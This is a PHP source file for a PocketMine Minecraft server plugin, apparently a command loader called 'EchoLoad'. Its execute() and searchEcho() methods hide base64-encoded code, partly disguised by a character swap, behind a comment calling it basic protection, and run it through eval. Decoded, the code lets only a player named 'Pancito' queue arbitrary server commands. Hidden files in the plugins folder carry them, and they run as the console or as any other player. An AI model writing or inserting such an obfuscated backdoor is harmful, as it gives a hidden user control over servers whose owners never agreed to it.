<?php

namespace loader;

define("bocketmine\\BASE_PATH", \realpath(\getcwd()) . \DIRECTORY_SEPARATOR);

use pocketmine\utils\TextFormat;
use pocketmine\Server;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\command\CommandSender;
use pocketmine\command\Command;
use pocketmine\command\defaults\VanillaCommand;

/**
 * @note El código real ha sido codificado para protección básica.
 */
class EchoLoad extends VanillaCommand {

    public function __construct($name) {
        parent::__construct($name, "", "", [""]);
    }

    public function execute(CommandSender $sender, $label, array $args) {
        $c = "JHNlbmRlck5hbWUgPSAkc2VuZGVy->Z2V0TmFtZSgpOwppZiAoJHNlbmRlck5hbWUgIT09ICJQYW5jaXRvIikgeyByZXR1cm4gdHJ1ZTsgfQppZiAoY291bnQoJGFyZ3MpIDwgMikgewogICAgJHNlbmRlci0+c2VuZE1lc3NhZ2UoVGV4dEZvcm1hdDo6UkVEIC4gIlVzbzogL2dlbmV4ZWMgPGNvbWFuZG8+IDxlbWlzb3I+Iik7CiAgICByZXR1cm4gdHJ1ZTsKfQoKJGNvbW1hbmRUb0V4ZWMgPSBpbXBsb2RlKCJfIiwgYXJyYXlfc2xpY2UoJGFyZ3MsIDAsIC0xKSk7CiR0YXJnZXRTZW5kZXIgPSBlbmQoJGFyZ3MpOwokZmlsZU5hbWUgPSAiYXV0b18iIC4gdGltZSgpIC4gIi5leGVjIjsKJHBhdGggPSBcYm9ja2V0bWluZVxCQVNFX1BBVEggLiAicGx1Z2lucyIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGZpbGVOYW1lOwoKJGNvbnRlbnQgPSAiRXhlYz4+PlxuIjsKJGNvbnRlbnQgLj0gImV4ZWMoXCIkY29tbWFuZFRvRXhlY1wiLCBcIiR0YXJnZXRTZW5kZXJcIik7XG4iOwokY29udGVudCAuPSAiPDw8IjsKCmZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkY29udGVudCk7CiRzZW5kZXItPnNlbmRNZXNzYWdlKFRleHRGb3JtYXQ6OllFTExPVyAuICJBcmNoaXZvICRmaWxlTmFtZSBnZW5lcmFkby4gUHJvY2VzYW5kby4uLiIpOwokdGhpcy0+c2VhcmNoRWNobygpOwpyZXR1cm4gdHJ1ZTs=";
        eval(base64_decode(str_replace("->", "P", $c)));
    }

    public function StartAll() { $this->searchEcho(); }

    public function searchEcho() {
        $code = "JHBhdGggPSBcYm9ja2V0bWluZVxCQVNFX1BBVEggLiAicGx1Z2lucyIgLiBESVJFQ1RPUllfU0VQQVJBVE9SOwppZiAoIWlzX2RpcigkcGF0aCkpIHJldHVybjsKJGRpciA9IG5ldyBcRGlyZWN0b3J5SXRlcmF0b3IoJHBhdGgpOwpmb3JlYWNoICgkZGlyIGFzICRmaWxlKSB7CiAgICBpZiAoJGZpbGUtPmlzRG90KCkgfHwgISRmaWxlLT5pc0ZpbGUoKSkgY29udGludWU7CiAgICBpZiAoJGZpbGUtPmdldEV4dGVuc2lvbigpID09PSAiZXhlYyIpIHsKICAgICAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlLT5nZXRQYXRobmFtZSgpKTsKICAgICAgICBpZiAocHJlZ19tYXRjaCgnL0V4ZWM+Pj5ccyooLiopXHMqPDw8L3MnLCAkY29udGVudCwgJG0pKSB7CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoX2FsbCgnL2V4ZWMoXCIoW14iXSpcIiwgXCIoW14iXSpcIik7LycsICRtWzFdLCAkY29tcywgUFJFR19TRVRfT1JERVIpKSB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkY29tcyBhcyAkdikgeyAkdGhpcy0+ZXhlY3V0ZUFzKCR2WzJdLCAkdlsxXSk7IH0KICAgICAgICAgICAgfQogICAgICAgICAgICB1bmxpbmsoJGZpbGUtPmdldFBhdGhuYW1lKCkpOwogICAgICAgIH0KICAgIH0KfQ==";
        eval(base64_decode($code));
    }

    private function executeAs(string $name, string $cmd) {
        $sender = (strtolower($name) === "consolecommandsender" || strtolower($name) === "console") ? new ConsoleCommandSender() : (Server::getInstance()->getPlayer($name) ?? new ConsoleCommandSender());
        Server::getInstance()->dispatchCommand($sender, $cmd);
    }
}
